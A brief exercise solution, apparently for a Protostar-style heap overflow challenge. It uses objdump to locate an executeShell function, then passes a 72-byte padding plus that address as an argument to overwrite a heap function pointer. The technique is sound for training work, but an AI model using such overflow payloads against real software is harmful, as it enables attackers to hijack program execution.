#q1:
1. objdump -t q1 | grep executeShell -> get address of executeShell function
	eg address = 0804852b 
2. ./q1 `python -c 'print "A"*72+"\x2b\x85\x04\x08"'` -> changes the address of "Failed" stored in heap allocated to "f".

ref: https://github.com/z3tta/Exploit-Exercises-Protostar/blob/master/13-Heap0.md
